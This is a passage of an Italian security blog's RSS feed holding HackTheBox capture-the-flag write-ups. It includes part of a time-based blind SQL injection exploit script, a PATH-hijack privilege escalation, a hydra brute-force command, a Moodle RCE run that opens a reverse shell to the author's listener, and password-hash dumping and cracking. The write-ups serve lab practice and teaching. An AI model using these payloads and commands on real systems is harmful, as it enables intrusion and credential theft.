            ord_db_name_temp &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; ord_db_name &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#008000&#34;&gt;hex&lt;/span&gt;(&lt;span style=&#34;color:#008000&#34;&gt;ord&lt;/span&gt;(dictionary[i]))[&lt;span style=&#34;color:#666&#34;&gt;2&lt;/span&gt;:]
            beautify_print_try(temp_db_name)
            payload &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;a,b,1,5))+and+(select+sleep(&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#008000&#34;&gt;str&lt;/span&gt;(TIME) &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;)+from+cms_users+where+username+like+0x&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; ord_db_name_temp &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;25+and+user_id+like+0x31)+--+&amp;#34;&lt;/span&gt;
            url &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; url_vuln &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&amp;amp;m1_idlist=&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; payload
            start_time &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; time&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;time()
            r &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; session&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;get(url)
            elapsed_time &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; time&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;time() &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; start_time
            &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;if&lt;/span&gt; elapsed_time &lt;span style=&#34;color:#666&#34;&gt;&amp;gt;=&lt;/span&gt; TIME:
                flag &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; True
                &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;break&lt;/span&gt;
        &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;if&lt;/span&gt; flag:
            db_name &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; temp_db_name
            ord_db_name &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; ord_db_name_temp
    output &lt;span style=&#34;color:#666&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;[+] Username found: &amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; db_name
    flag &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; True

&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#00f&#34;&gt;dump_email&lt;/span&gt;():
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;global&lt;/span&gt; flag
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;global&lt;/span&gt; email
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;global&lt;/span&gt; output
    ord_email &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
    ord_email_temp &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;while&lt;/span&gt; flag:
        flag &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; False
        &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#a2f;font-weight:bold&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#008000&#34;&gt;range&lt;/span&gt;(&lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#008000&#34;&gt;len&lt;/span&gt;(dictionary)):
            temp_email &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; email &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; dictionary[i]
            ord_email_temp &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; ord_email &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#008000&#34;&gt;hex&lt;/span&gt;(&lt;span style=&#34;color:#008000&#34;&gt;ord&lt;/span&gt;(dictionary[i]))[&lt;span style=&#34;color:#666&#34;&gt;2&lt;/span&gt;:]
            beautify_print_try(temp_email)
            payload &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;a,b,1,5))+and+(select+sleep(&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#008000&#34;&gt;str&lt;/span&gt;(TIME) &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;)+from+cms_users+where+email+like+0x&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; ord_email_temp &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;25+and+user_id+like+0x31)+--+&amp;#34;&lt;/span&gt;
            url &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; url_vuln &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&amp;amp;m1_idlist=&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; payload
            start_time &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; time&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;time()
            r &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; session&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;get(url)
            elapsed_time &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; time&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;time() &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; start_time
            &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;if&lt;/span&gt; elapsed_time &lt;span style=&#34;color:#666&#34;&gt;&amp;gt;=&lt;/span&gt; TIME:
                flag &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; True
                &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;break&lt;/span&gt;
        &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;if&lt;/span&gt; flag:
            email &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; temp_email
            ord_email &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; ord_email_temp
    output &lt;span style=&#34;color:#666&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;[+] Email found: &amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; email
    flag &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; True

dump_salt()
dump_username()
dump_email()
dump_password()

&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;if&lt;/span&gt; options&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;cracking:
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;print&lt;/span&gt; colored(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;[*] Now try to crack password&amp;#34;&lt;/span&gt;)
    crack_password()

beautify_print()&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;La vulnerabilità specifica di cui fa uso l&amp;rsquo;exploit si chiama Time Based Blind
SQL Injection, e sfrutta la funzione &lt;code&gt;SLEEP&lt;/code&gt; per introdurre un ritardo nel caso in
cui le condizioni della query siano corrette. Trovate un approfondimento &lt;a href=&#34;http://www.sqlinjection.net/time-based/&#34;&gt;qui&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Eseguiamo allora l&amp;rsquo;exploit:
&lt;img src=&#34;https://samirettali.com/images/htb-writeup/sql.gif&#34; alt=&#34;SQL&#34; /&gt;&lt;/p&gt;

&lt;p&gt;L&amp;rsquo;exploit ha trovato lo username, l&amp;rsquo;hash della password e il salt usato per
l&amp;rsquo;hash dell&amp;rsquo;utente del pannello di amministrazione. Il formato dell&amp;rsquo;hash della
password è MD5($SALT.$PASSWORD), usiamo allora hashcat in modalità dictionary
attack usando la wordlist &lt;a href=&#34;https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt&#34;&gt;rockyou&lt;/a&gt;:
&lt;img src=&#34;https://samirettali.com/images/htb-writeup/hashcat.png&#34; alt=&#34;hashcat&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Quando hashcat finisce vediamo il risultato con questo comando:
&lt;img src=&#34;https://samirettali.com/images/htb-writeup/hashcat2.png&#34; alt=&#34;hashcat&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Proviamo ad usare i dati trovati per accedere tramite ssh:
&lt;img src=&#34;https://samirettali.com/images/htb-writeup/ssh.png&#34; alt=&#34;ssh&#34; /&gt;&lt;/p&gt;

&lt;h1 id=&#34;root-privilege-escalation&#34;&gt;Root - Privilege escalation&lt;/h1&gt;

&lt;p&gt;Adesso dobbiamo fare privilege escalation per diventare root. Uno dei primi tool
che in genere si utilizzano è &lt;a href=&#34;https://github.com/rebootuser/LinEnum&#34;&gt;LinEnum&lt;/a&gt;,
che fa un&amp;rsquo;enumerazione generale del sistema. Deve essere eseguito sulla macchina
che si vuole analizzare, però le macchine di HackTheBox non hanno accesso a
internet. Cloniamo allora il repository sul nostro computer e copiamo il file
con scp:
&lt;img src=&#34;https://samirettali.com/images/htb-writeup/scp.png&#34; alt=&#34;scp&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Eseguendolo sulla macchina non troviamo niente di interessante. Facciamo la
stessa cosa con &lt;a href=&#34;https://github.com/DominicBreuker/pspy&#34;&gt;pspy&lt;/a&gt;, un tool per
monitorare i processi.&lt;/p&gt;

&lt;p&gt;Notiamo che ogni minuto viene eseguito lo script cleanup.pl.
&lt;img src=&#34;https://samirettali.com/images/htb-writeup/pspy.png&#34; alt=&#34;pspy&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Aspettando ancora non succede niente. Provando a connetterci con un altra
sessione ssh vediamo che viene eseguito il comando&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sh -c /usr/bin/env -i &lt;span style=&#34;color:#19177c&#34;&gt;PATH&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin: &lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;&lt;/span&gt;/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d &amp;gt; /run/motd.dynamic.new&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&#34;https://samirettali.com/images/htb-writeup/pspy2.png&#34; alt=&#34;pspy2&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Il comando &lt;code&gt;run-parts&lt;/code&gt; esegue tutti i file presenti nella
directory indicata e l&amp;rsquo;output viene rediretto in &lt;code&gt;/run/motd.dynamic.new&lt;/code&gt;.
Vediamo allora i permessi della directory contenente gli scripts e il loro
contenuto:
&lt;img src=&#34;https://samirettali.com/images/htb-writeup/update-motd.png&#34; alt=&#34;update-motd&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Lo script esegue il comando uname con alcuni parametri. Vediamo però che il
comando run-parts viene chiamato anteponendo il comando &lt;code&gt;env -i&lt;/code&gt;, che serve a
ignorare le variabili di ambiente. Viene inoltre definita la variabile di
ambiente &lt;code&gt;PATH&lt;/code&gt;.  L&amp;rsquo;eseguibile &lt;code&gt;uname&lt;/code&gt; viene cercato in tutte le directory a
partire dalla prima. Vediamo se possiamo scrivere in una delle directory che
vengono usate.
&lt;img src=&#34;https://samirettali.com/images/htb-writeup/sbin.png&#34; alt=&#34;sbin&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Abbiamo fortuna già con la prima! Scriviamo allora uno script in quella
directory e chiamiamolo uname:
&lt;img src=&#34;https://samirettali.com/images/htb-writeup/uname.png&#34; alt=&#34;uname&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Salviamolo e diamogli i permessi di esecuzione con &lt;code&gt;chmod +x&lt;/code&gt;. Connettiamoci di
nuovo per far chiamare lo script e stampiamo il contenuto del file:
&lt;img src=&#34;https://samirettali.com/images/htb-writeup/root.png&#34; alt=&#34;root&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Alla prossima!&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Teacher - HackTheBox</title>
      <link>https://samirettali.com/posts/2019-07-05-teacher/</link>
      <pubDate>Fri, 05 Jul 2019 02:42:07 +0000</pubDate>
      
      <guid>https://samirettali.com/posts/2019-07-05-teacher/</guid>
      <description>&lt;p&gt;Teacher è una macchina Linux da 20 punti con indirizzo ip &lt;code&gt;10.10.10.153&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://samirettali.com/images/htb-teacher/teacher.png&#34; alt=&#34;Teacher&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Facciamo uno scan delle porte con nmap:
&lt;img src=&#34;https://samirettali.com/images/htb-teacher/scan.png&#34; alt=&#34;Scan&#34; /&gt;&lt;/p&gt;

&lt;p&gt;C&amp;rsquo;è un web server in esecuzione sulla porta 80, visitiamolo:
&lt;img src=&#34;https://samirettali.com/images/htb-teacher/web.png&#34; alt=&#34;Web&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Navigando tra le pagine del sito vediamo un immagine mancante nella sezione
gallery:
&lt;img src=&#34;https://samirettali.com/images/htb-teacher/gallery.png&#34; alt=&#34;Gallery&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Andando a leggere il sorgente, notiamo che nel caso in cui non venga caricata
correttamente quell&amp;rsquo;immagine, verrà loggato un messaggio nella console del
browser:
&lt;img src=&#34;https://samirettali.com/images/htb-teacher/source.png&#34; alt=&#34;Source&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Vediamo allora cosa contiene il file:
&lt;img src=&#34;https://samirettali.com/images/htb-teacher/5.png&#34; alt=&#34;Source&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Abbiamo quindi una password che inizia con &lt;code&gt;Th4C00lTheacha&lt;/code&gt; e a cui manca un
carattere.&lt;/p&gt;

&lt;p&gt;Continuiamo la nostra ricerca e lanciamo un tool per cercare eventuali directory
o file esposti (io uso &lt;a href=&#34;https://github.com/ffuf/ffuf&#34;&gt;ffuf&lt;/a&gt; ma vanno bene anche
&lt;a href=&#34;https://github.com/maurosoria/dirsearch&#34;&gt;dirsearch&lt;/a&gt;,
&lt;a href=&#34;https://github.com/OJ/gobuster&#34;&gt;gobuster&lt;/a&gt; o altri):
&lt;img src=&#34;https://samirettali.com/images/htb-teacher/discovery.png&#34; alt=&#34;Discovery&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Notiamo le directory phpmyadmin, che però risponde con codice &lt;code&gt;403 Access denied&lt;/code&gt;,
e la directory moodle:
&lt;img src=&#34;https://samirettali.com/images/htb-teacher/moodle.png&#34; alt=&#34;Moodle&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Moodle è un CMS usato dagli istutiti scolastivi, in genere per pubblicare
materiale sui vari corsi.
Provando a fare il login vediamo che c&amp;rsquo;è la possibilità di entrare come ospite:
&lt;img src=&#34;https://samirettali.com/images/htb-teacher/login.png&#34; alt=&#34;Login&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Provando a navigare tra le varie sezioni non scopriamo niente di nuovo in quanto
ci viene comunque chiesto di eseguire il login.&lt;/p&gt;

&lt;p&gt;Il corso di Algebra ha come professore Giovanni Chhatta, lo stesso nome che che
c&amp;rsquo;era nel messaggio nascosto nell&amp;rsquo;immagine &lt;code&gt;5.png&lt;/code&gt;. Abbiamo anche parte della
password.&lt;/p&gt;

&lt;p&gt;Usiamo &lt;a href=&#34;https://github.com/crunchsec/crunch&#34;&gt;crunch&lt;/a&gt; per generare le possibili
password. Crunch sostituisce alcuni simboli con un set di caratteri predefinito:
* &lt;code&gt;@&lt;/code&gt; caratteri minuscoli
* &lt;code&gt;,&lt;/code&gt; caratteri maiuscoli
* &lt;code&gt;%&lt;/code&gt; numeri
* &lt;code&gt;^&lt;/code&gt; simboli&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://samirettali.com/images/htb-teacher/crunch.png&#34; alt=&#34;Crunch&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Usiamo &lt;a href=&#34;https://github.com/vanhauser-thc/thc-hydra&#34;&gt;hydra&lt;/a&gt; per eseguire trovare
la password giusta:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;vagrant@kali:~$ hydra -t 8 -l Giovanni -P passwords.txt http-form-post://10.10.10.153 -f -m &amp;#34;/moodle/login/index.php:username=^USER^&amp;amp;password=^PASS^:Invalid&amp;#34;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Scopriamo che la password è &amp;ldquo;Th4C00lTheacha#&amp;rdquo;. Facendo il login e dando un&amp;rsquo;occhiata in giro non si trova niente di utile. Andando sulla pagina del corso di Algebra, in basso c&amp;rsquo;è in link che dice &amp;ldquo;Moodle Docs for this page&amp;rdquo;. Cliccandolo ci porta alla documentazione di Moodle 3.4. Cerchiamo se c&amp;rsquo;è qualche vulnerabilità nota su exploitdb.
Troviamo un exploit che permette RCE, che sfrutta l&amp;rsquo;esecuzione di codice nella creazione di un quiz sul portale. Ecco il link
&lt;a href=&#34;https://www.exploit-db.com/exploits/46551&#34;&gt;https://www.exploit-db.com/exploits/46551&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;L&amp;rsquo;exploit di default esegue una reverse shell, dobbiamo quindi mettere netcat in
ascolto sulla nostra macchina:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;vagrant@kali:~$ nc -nlvp 8081&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Poi su un altro terminale eseguiamo l&amp;rsquo;exploit, i parametri ip e port si
riferiscono alla sessione di netcat in ascolto.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;vagrant@kali:~$ php moodle-3.4.3-rce.php url=http://10.10.10.153/moodle user=Giovanni pass=Th4C00lTheacha# ip=10.10.15.48 port=8081 course=2                                    

*------------------------------*
* Noodle [Moodle RCE] (v3.4.1) *
*------------------------------*

[!] Make sure you have a listener
[!] at 10.10.15.48:8081

[*] Logging in as user Giovanni with password Th4C00lTheacha#                                 
[+] Successful Login
[&amp;gt;] Moodle Session r07l94v8etnshdrrjpr6a22uo5
[&amp;gt;] Moodle Key 3jfgrc2UVo
[*] Loading Course ID 2
[+] Successfully Loaded Course
[*] Enable Editing
[+] Successfully Enabled Course Editing
[*] Adding Quiz
[+] Successfully Added Quiz
[*] Configuring New Quiz
[+] Successfully Configured Quiz
[*] Loading Edit Quiz Page
[+] Successfully Loaded Edit Quiz Page
[*] Adding Calculated Question
[+] Successfully Added Calculation Question
[*] Adding Evil Question
[+] Successfully Created Evil Question
[*] Sending Exploit

[&amp;gt;] You should receive a reverse shell attempt from the target at 10.10.15.48 on port 8081    
[&amp;gt;] If connection was successful this program will wait here until you close the connection.  
[&amp;gt;] You should be able to Ctrl+C and retain the connection through netcat.   &lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;L&amp;rsquo;exploit dovrebbe connettere il server alla nostra sessione di netcat, dandoci
quindi una shell remota, eseguiamo il seguente comando python per spawnare una
shell più utilizzabile:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;$ python -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Dovremmo avere la seguente shell:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;www-data@teacher:/var/www/html/moodle/question$&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Carichiamo sul server lo script LinEnum.sh per fare enumeration. Per caricarlo, dato che il server non ha
accesso a internet, eseguiamo un web server sul nostro computer nella cartella
dove abbiamo LinEnum.sh, e dall&amp;rsquo;altra parte scarichiamolo con wget.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;vagrant@kali:~$ python2 -m SimpleHTTPServer 9999&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;In questo caso 10.10.15.48 è il mio IP&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;www-data@teacher:/tmp$ wget http://10.10.15.48:9999/LinEnum.sh&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Eseguendo LinEnum scopriamo che possiamo leggere /etc/shadow, ma provando
crackare le password degli utenti giovanni e root con rockyou non si trova
niente.
Vediamo invece che c&amp;rsquo;è un database mysql in esecuzione, cerchiamo nel file
moodle/config.php la password per connettersi al database e scopriamo che è
&amp;ldquo;Welkom1!&amp;rdquo;. Connettiamoci allora al database:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;www-data@teacher:/var/www/html/moodle/question$ mysql -u root -p&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Vediamo quali database ci sono:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;MariaDB [moodle]&amp;gt; show databases; 
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| moodle             |
| mysql              |
| performance_schema |
| phpmyadmin         |
+--------------------+
5 rows in set (0.00 sec)&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Vediamo cosa c&amp;rsquo;è nel database moodle:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;MariaDB [moodle]&amp;gt; show tables;
show tables;
+----------------------------------+
| Tables_in_moodle                 |
+----------------------------------+
| mdl_analytics_indicator_calc     |
| mdl_analytics_models             |
| mdl_analytics_models_log         |
| mdl_analytics_predict_samples    |
| mdl_analytics_prediction_actions |
| mdl_analytics_predictions        |
| mdl_analytics_train_samples      |
| mdl_analytics_used_analysables   |
| mdl_analytics_used_files         |
| mdl_assign                       |
               ...
| mdl_user                         |
| mdl_workshopform_accumulative    |
| mdl_workshopform_comments        |
| mdl_workshopform_numerrors       |
| mdl_workshopform_numerrors_map   |
| mdl_workshopform_rubric          |
| mdl_workshopform_rubric_config   |
| mdl_workshopform_rubric_levels   |
+----------------------------------+
388 rows in set (0.01 sec)

MariaDB [moodle]&amp;gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Controlliamo la tabella mdl_user:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;MariaDB [moodle]&amp;gt; select username, password from mdl_user;                                                                                                                                                           
+-------------+--------------------------------------------------------------+
| username    | password                                                     |
+-------------+--------------------------------------------------------------+
| guest       | $2y$10$ywuE5gDlAlaCu9R0w7pKW.UCB0jUH6ZVKcitP3gMtUNrAebiGMOdO |
| admin       | $2y$10$7VPsdU9/9y2J4Mynlt6vM.a4coqHRXsNTOq/1aA6wCWTsF2wtrDO2 |
| giovanni    | $2y$10$38V6kI7LNudORa7lBAT0q.vsQsv4PemY7rf/M1Zkj/i1VqLO0FSYO |
| Giovannibak | 7a860966115182402ed06375cf0a22af                             |
+-------------+--------------------------------------------------------------+
4 rows in set (0.00 sec)

MariaDB [moodle]&amp;gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Copiamo gli hash in un file e proviamo a crackarli con john the ripper usando la
solita wordlist rockyou&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;vagrant@kali:~$ john dbpasswords.txt --wordlist=rockyou.txt&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Scopriamo che la password è expelled&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>